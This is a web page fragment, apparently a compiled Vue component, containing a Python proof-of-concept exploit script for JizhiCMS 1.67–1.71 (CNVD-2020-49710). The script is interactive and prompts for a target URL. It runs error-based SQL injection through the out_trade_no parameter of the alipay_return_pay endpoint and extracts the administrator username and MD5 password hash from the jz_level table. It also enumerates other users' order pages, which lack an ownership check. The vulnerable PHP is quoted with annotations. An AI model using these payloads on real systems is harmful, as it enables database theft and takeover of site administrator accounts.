    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mPOC_Des: http://wiki.peiqi.tech                                   \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mGithub : https://github.com/PeiQi0                                 \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34m公众号 : PeiQi文库                                                \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[34mVersion: 极致CMS 1.67 - 171             \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+  \\033[36m使用格式: python3 CNVD-2020-49710.py     \\033[0m&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;+------------------------------------------&#39;</span><span class="token punctuation">)</span>


    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        poc <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&#39;选择使用的poc：\\n&#39;</span>
                        <span class="token string">&#39;1.sql注入\\n&#39;</span>
                        <span class="token string">&#39;2.用户购物车爆破\\n&#39;</span>
                        <span class="token string">&#39;3.GET 网站管理员账号密码\\n&#39;</span>
                        <span class="token string">&#39;4.退出 quit\\n&#39;</span>
                        <span class="token string">&#39;poc:&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> poc <span class="token operator">==</span> <span class="token string">&#39;1&#39;</span><span class="token punctuation">:</span>
            poc_1<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> poc <span class="token operator">==</span> <span class="token string">&#39;2&#39;</span><span class="token punctuation">:</span>
            poc_2<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> poc <span class="token operator">==</span> <span class="token string">&#39;3&#39;</span><span class="token punctuation">:</span>
            poc_3<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> poc <span class="token operator">==</span> <span class="token string">&#39;4&#39;</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;参数错误，重新输入&#39;</span><span class="token punctuation">)</span>



<span class="token keyword">def</span> <span class="token function">poc_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">## poc_1 ---&gt;  sql注入漏洞点( Home/c/MypayController.php [alipay_notify_pay])</span>
    <span class="token comment">## 使用范围 极致cms 1.71 + 1.7 + 1.67 版本</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    function alipay_return_pay(){
    		extendFile(&#39;pay/alipay/AlipayServiceCheck.php&#39;);
    		//支付宝公钥，账户中心-&gt;密钥管理-&gt;开放平台密钥，找到添加了支付功能的应用，根据你的加密类型，查看支付宝公钥
    		$alipayPublicKey=$this-&gt;webconf[&#39;alipay_public_key&#39;];

    		$aliPay = new \\AlipayServiceCheck($alipayPublicKey);
    		//验证签名
    		$result = $aliPay-&gt;rsaCheck($_GET,$_GET[&#39;sign_type&#39;]);

            $result=true;   &lt;&lt;--- (添加的php代码 模拟打开支付宝 并通过签名验证)

            if($result===true){
    			//同步回调一般不处理业务逻辑，显示一个付款成功的页面，或者跳转到用户的财务记录页面即可。
    			//echo &#39;&lt;h1&gt;付款成功&lt;/h1&gt;&#39;;
    			$out_trade_no = htmlspecialchars($_GET[&#39;out_trade_no&#39;]);  &lt;&lt; ---- （漏洞位置，只过滤了xss，没有调用函数过滤sql语句）
    			$orderno = $out_trade_no;
    			$paytime = time();
    			$order = M(&#39;orders&#39;)-&gt;find([&#39;orderno&#39;=&gt;$orderno]);  &lt;&lt; --- (执行sql注入的语句)
    &quot;&quot;&quot;</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exploit_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;攻击网站url：\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;请输入你的payload（sql）语句:\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token comment"># mypay/alipay_return_pay?out_trade_no=1</span>
            payload_url <span class="token operator">=</span> exploit_url <span class="token operator">+</span> <span class="token string">&quot;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(&quot;</span> <span class="token operator">+</span> payload <span class="token operator">+</span> <span class="token string">&quot;),0x7e),1)--+&quot;</span>
            <span class="token comment"># print(&#39;你的payload语句为: \\n&#39;, payload_url)</span>

            response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload_url<span class="token punctuation">)</span>
            <span class="token comment"># print(response.text)</span>

            data <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&#39;~(.*?)~&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> data <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;[!!] sql语句错误 或者 版本高于 [极致cms 1.71  -&gt; 发布时间 2020-05-25]&#39;</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;得到的数据为:\\n&#39;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;出现错误&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>



<span class="token comment"># http://jizhicms.com/user/orderdetails/orderno/No20200712213457.html</span>
<span class="token keyword">def</span> <span class="token function">poc_2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">## poc_2 ---&gt; 用户购物车页面获取 (Home/c/UserController.php [orderdetails])</span>
    <span class="token comment">## 漏洞点 ---&gt; 无用户cookie id 的验证</span>
    <span class="token comment">## 使用范围 极致cms 1.8以下全版本 (当前最新 v1.8 更新时间:6月30日)</span>
    <span class="token triple-quoted-string string">&quot;&quot;&quot;
    function orderdetails(){
    	$orderno = $this-&gt;frparam(&#39;orderno&#39;,1);
		$order = M(&#39;orders&#39;)-&gt;find([&#39;orderno&#39;=&gt;$orderno]);
		if($orderno &amp;&amp; $order){
			/*
			if($order[&#39;isshow&#39;]!=1){
				//超时或者已支付
				if($order[&#39;isshow&#39;]==0){
					$msg = &#39;订单已删除&#39;;
				}
				if($order[&#39;isshow&#39;]==3){
					$msg = &#39;订单已过期，不可支付！&#39;;
				}
				if($order[&#39;isshow&#39;]==2){
					$msg = &#39;订单已支付，请勿重复操作！&#39;;
				}
				if($this-&gt;frparam(&#39;ajax&#39;)){
					JsonReturn([&#39;code&#39;=&gt;1,&#39;msg&#39;=&gt;$msg]);
				}
				Error($msg);

			}
			*/
			$carts = explode(&#39;||&#39;,$order[&#39;body&#39;]);
			$new = [];
			foreach($carts as $k=&gt;$v){
				$d = explode(&#39;-&#39;,$v);
				if($d[0]!=&#39;&#39;){
					//兼容多模块化
					if(isset($this-&gt;classtypedata[$d[0]])){
						$type = $this-&gt;classtypedata[$d[0]];
						$res = M($type[&#39;molds&#39;])-&gt;find([&#39;id&#39;=&gt;$d[1]]);
						$new[] = [&#39;info&#39;=&gt;$res,&#39;num&#39;=&gt;$d[2],&#39;tid&#39;=&gt;$d[0],&#39;id&#39;=&gt;$d[1],&#39;price&#39;=&gt;$d[3]];
					}else{
						$new[] = [&#39;info&#39;=&gt;false,&#39;num&#39;=&gt;$d[2],&#39;tid&#39;=&gt;$d[0],&#39;id&#39;=&gt;$d[1],&#39;price&#39;=&gt;$d[3]];
					}
				}

			}
			$this-&gt;carts = $new;
			$this-&gt;order = $order;
			$this-&gt;display($this-&gt;template.&#39;/user/orderdetails&#39;);
		}

    }
    &quot;&quot;&quot;</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exploit_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;攻击网站url：\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        year_day    <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;输入日期(例如:20200712):&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        shop <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

        <span class="token comment"># 遍历所有出现的用户购物车页面</span>
        <span class="token keyword">for</span> num <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">,</span><span class="token number">999999</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment">#payload_url = &quot;user/orderdetails/orderno/No&quot; + year_day + str(num) + &quot;.html&quot;</span>
                payload_url <span class="token operator">=</span> <span class="token string">&quot;user/orderdetails/orderno/No20200712213927.html&quot;</span>

                response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>exploit_url <span class="token operator">+</span> payload_url<span class="token punctuation">)</span>

                <span class="token comment"># 打印结果</span>
                <span class="token keyword">if</span> <span class="token string">&#39;总金额&#39;</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;购物车页面：&#39;</span><span class="token punctuation">,</span>payload_url<span class="token punctuation">)</span>
                        shop<span class="token punctuation">.</span>append<span class="token punctuation">(</span>payload_url<span class="token punctuation">)</span>

                <span class="token keyword">for</span> page <span class="token keyword">in</span> shop<span class="token punctuation">:</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span>page<span class="token punctuation">)</span>
                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>

    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;出现错误&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">poc_3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">## poc_3  ---&gt; 得到账号密码  ( Home/c/MypayController.php [alipay_notify_pay])</span>
    <span class="token comment">## 使用范围 ---&gt; 极致cms 1.71 + 1.7 + 1.67 版本</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        exploit_url <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">&quot;攻击网站url：\\n&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token comment"># payload --&gt; updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+</span>
        <span class="token comment"># 用户名 + 密码 长度</span>

        payload_url <span class="token operator">=</span> exploit_url <span class="token operator">+</span> <span class="token string">&quot;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct length(concat(0x23,name,0x3a,pass,0x23)) from jz_level limit 0,1),0x7e),1)--+&quot;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload_url<span class="token punctuation">)</span>
        str_long <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&#39;~(.*?)~&#39;</span><span class="token punctuation">,</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment">#print(str_long)</span>

        <span class="token comment"># 得到账号密码，密码md5格式</span>
        payload_url <span class="token operator">=</span> exploit_url <span class="token operator">+</span> <span class="token string">&quot;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),1,32) from jz_level limit 0,1),0x7e),1)--+&quot;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload_url<span class="token punctuation">)</span>
        admin_name_1 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&quot;~#(.*?)&#39;&quot;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment">#print(admin_name_1)</span>

        payload_url <span class="token operator">=</span> exploit_url <span class="token operator">+</span> <span class="token string">&quot;mypay/alipay_return_pay?out_trade_no=1%27 and updatexml(1,concat(0x7e,(select distinct substring(concat(0x23,name,0x3a,pass,0x23),32,&quot;</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>str_long<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">&quot;) from jz_level limit 0,1),0x7e),1)--+&quot;</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>payload_url<span class="token punctuation">)</span>
        admin_name_2 <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r&#39;~(.*?)~&#39;</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token comment">#print(admin_name_2)</span>

        <span class="token comment"># 分割账号密码</span>
        admin_passwd <span class="token operator">=</span> admin_name_1 <span class="token operator">+</span> admin_name_2
        admin_passwd <span class="token operator">=</span> admin_passwd<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&#39;:&#39;</span><span class="token punctuation">)</span>
        admin <span class="token operator">=</span> admin_passwd<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        passwd <span class="token operator">=</span> admin_passwd<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
        <span class="token comment">#print(admin)</span>
        <span class="token comment">#print(passwd)</span>

        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&quot;成功得到账号密码：\\n&quot;</span>
              <span class="token string">&quot;用户名:&quot;</span><span class="token punctuation">,</span>admin<span class="token punctuation">,</span>
              <span class="token string">&quot;\\n密码(md5):&quot;</span><span class="token punctuation">,</span>passwd<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;出现错误&#39;</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">&#39;------------------ peiqi -----------------------&#39;</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202170919669.jpg" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,35),o=[e];function i(l,c){return s(),a("div",null,o)}const k=n(p,[["render",i],["__file","极致CMS alipay_return_pay SQL注入漏洞.html.vue"]]);export{k as default};
